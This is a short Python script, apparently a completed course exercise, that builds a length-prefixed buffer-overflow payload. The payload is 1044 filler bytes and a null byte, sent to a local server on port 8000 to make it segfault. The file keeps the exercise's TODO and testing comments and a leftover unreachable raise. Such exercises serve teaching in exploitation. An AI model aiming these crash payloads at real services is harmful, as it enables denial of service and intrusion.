#!/usr/bin/python

import os, socket, struct


HOST = '127.0.0.1'
PORT = 8000


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This data should cause the server to crash (and generate a segfault).
    '''

    # TODO: IMPLEMENT THIS FUNCTION
    mes = 'a'*1044 + chr(0) 
    mes = struct.pack('>L', len(mes)) + mes
    return mes



    raise NotImplementedError()

    # NOTE:
    # Don't delete this function - we are going to test it directly in our
    # tests, without running the main() function below.


def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
